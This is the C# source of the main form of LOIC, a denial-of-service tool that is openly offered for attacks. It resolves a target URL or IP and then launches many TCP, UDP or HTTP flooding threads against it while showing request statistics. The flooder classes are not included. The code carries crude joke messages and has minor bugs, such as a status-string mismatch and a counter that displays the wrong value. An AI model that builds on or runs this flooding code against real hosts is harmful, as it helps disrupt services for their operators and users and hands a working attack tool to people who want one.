/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace LOIC
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        public static XXPFlooder[] xxP;
        public static HTTPFlooder[] HTTP;
        string sIP, sMethod, sData, sSubsite;
        int iPort, iThreads, iProtocol, iDelay, iTimeout;
        bool bResp;

        bool intShowStats = false;
        public static string PrgDomain = "http://tox.awardspace.us/div/";
        public static string ToxDomain = "http://www.praetox.com/";

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!System.IO.Directory.Exists("tmp")) System.IO.Directory.CreateDirectory("tmp");
            this.Text += Application.ProductVersion;

            try
            {
                string lol = new System.Net.WebClient().DownloadString(
                    PrgDomain + "LOIC_version.php?cv=" + Application.ProductVersion);
                if (!lol.Contains("<VERSION>" + Application.ProductVersion + "</VERSION>"))
                {
                    bool GetUpdate = (DialogResult.Yes == MessageBox.Show(
                        "A new version is available. Update?",
                        "so i herd u liek mudkipz", MessageBoxButtons.YesNo));
                    if (GetUpdate)
                    {
                        string UpdateLink = new System.Net.WebClient().DownloadString(
                            ToxDomain + "inf/LOIC_link.html").Split('%')[1];
                        System.Diagnostics.Process.Start(UpdateLink + "?cv=" + Application.ProductVersion);
                        Application.Exit();
                    }
                }
            }
            catch
            {
                MessageBox.Show("Couldn't check for updates.\r\n\r\nAlso, cocks.", "A cat is fine too");
            }
        }

        private void cmdTargetURL_Click(object sender, EventArgs e)
        {
            string URL = txtTargetURL.Text.ToLower();
            if (URL.Length == 0)
            {
                new frmWtf().Show();
                MessageBox.Show("A URL is fine too...", "What the shit.");
                return;
            }
            if (!URL.StartsWith("http://")) URL = "http://" + URL;
            txtTarget.Text = "" + System.Net.Dns.GetHostEntry(new Uri(URL).Host).AddressList[0];
        }
        private void cmdTargetIP_Click(object sender, EventArgs e)
        {
            if (txtTargetIP.Text.Length == 0)
            {
                new frmWtf().Show();
                MessageBox.Show("I think you forgot the IP.", "What the shit.");
                return;
            }
            txtTarget.Text = txtTargetIP.Text;
        }
        private void txtTarget_Enter(object sender, EventArgs e)
        {
            cmdAttack.Focus();
        }

        private void cmdAttack_Click(object sender, EventArgs e)
        {
            if (cmdAttack.Text == "IMMA CHARGIN MAH LAZER")
            {
                try
                {
                    try { iPort = Convert.ToInt32(txtPort.Text); }
                    catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
                    
                    try { iThreads = Convert.ToInt32(txtThreads.Text); }
                    catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
                    
                    sIP = txtTarget.Text;
                    if (sIP == "" || sIP == "N O N E !")
                        throw new Exception("Select a target.");
                    
                    iProtocol = 0;
                    sMethod = cbMethod.Text;
                    if (sMethod=="TCP") iProtocol = 1;
                    if (sMethod=="UDP") iProtocol = 2;
                    if (sMethod=="HTTP") iProtocol = 3;
                    if (iProtocol == 0)
                        throw new Exception("Select a proper attack method.");
                    
                    sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
                    if (sData == "" && (iProtocol==1||iProtocol==2))
                        throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

                    sSubsite = txtSubsite.Text;
                    if (!sSubsite.StartsWith("/") && (iProtocol==3))
                        throw new Exception("You have to enter a subsite (for example \"/\")");

                    try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
                    catch { throw new Exception("What's up with something like that in the timeout box? =S"); }

                    bResp = chkResp.Checked;
                }
                catch (Exception ex) { new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return; }

                cmdAttack.Text = "Stop flooding";

                if (sMethod == "TCP" || sMethod == "UDP")
                {
                    xxP = new XXPFlooder[iThreads];
                    for (int a = 0; a < xxP.Length; a++)
                    {
                        xxP[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
                        xxP[a].Start();
                    }
                }
                if (sMethod == "HTTP")
                {
                    HTTP = new HTTPFlooder[iThreads];
                    for (int a = 0; a < HTTP.Length; a++)
                    {
                        HTTP[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
                        HTTP[a].Start();
                    }
                }

                tShowStats.Start();
            }
            else
            {
                cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
                if (xxP != null)
                {
                    for (int a = 0; a < xxP.Length; a++)
                    {
                        xxP[a].isFlooding = false;
                    }
                }
                if (HTTP != null)
                {
                    for (int a = 0; a < HTTP.Length; a++)
                    {
                        HTTP[a].isFlooding = false;
                    }
                }
                //tShowStats.Stop();
            }
        }

        private void tShowStats_Tick(object sender, EventArgs e)
        {
            if (intShowStats) return; intShowStats = true;

            bool isFlooding = false;
            if (cmdAttack.Text == "Stop for now") isFlooding = true;
            if (iProtocol == 1 || iProtocol == 2)
            {
                int iFloodCount = 0;
                for (int a = 0; a < xxP.Length; a++)
                {
                    iFloodCount += xxP[a].iFloodCount;
                }
                lbRequested.Text = "" + iFloodCount;
            }
            if (iProtocol == 3)
            {
                int iIdle = 0;
                int iConnecting = 0;
                int iRequesting = 0;
                int iDownloading = 0;
                int iDownloaded = 0;
                int iRequested = 0;
                int iFailed = 0;
                
                for (int a = 0; a < HTTP.Length; a++)
                {
                    iDownloaded += HTTP[a].iDownloaded;
                    iRequested += HTTP[a].iRequested;
                    iFailed += HTTP[a].iFailed;
                    if (HTTP[a].State == HTTPFlooder.ReqState.Ready ||
                        HTTP[a].State == HTTPFlooder.ReqState.Completed)
                        iIdle++;
                    if (HTTP[a].State == HTTPFlooder.ReqState.Connecting)
                        iConnecting++;
                    if (HTTP[a].State == HTTPFlooder.ReqState.Requesting)
                        iRequesting++;
                    if (HTTP[a].State == HTTPFlooder.ReqState.Downloading)
                        iDownloading++;
                    if (isFlooding && !HTTP[a].isFlooding)
                    {
                        int iaDownloaded = HTTP[a].iDownloaded;
                        int iaRequested = HTTP[a].iRequested;
                        int iaFailed = HTTP[a].iFailed;
                        HTTP[a] = null;
                        HTTP[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
                        HTTP[a].iDownloaded = iaDownloaded;
                        HTTP[a].iRequested = iaRequested;
                        HTTP[a].iFailed = iaFailed;
                        HTTP[a].Start();
                    }
                }
                lbFailed.Text = "" + iFailed;
                lbRequested.Text = "" + iRequested;
                lbDownloaded.Text = "" + iRequested;
                lbDownloading.Text = "" + iDownloading;
                lbRequesting.Text = "" + iRequesting;
                lbConnecting.Text = "" + iConnecting;
                lbIdle.Text = "" + iIdle;
            }

            intShowStats = false;
        }

        private void tbSpeed_ValueChanged(object sender, EventArgs e)
        {
            iDelay = tbSpeed.Value;
            if (HTTP != null)
            {
                for (int a = 0; a < HTTP.Length; a++)
                {
                    if (HTTP[a] != null) HTTP[a].Delay = iDelay;
                }
            }
            if (xxP != null)
            {
                for (int a = 0; a < xxP.Length; a++)
                {
                    if (xxP[a] != null) xxP[a].Delay = iDelay;
                }
            }
        }
    }
}
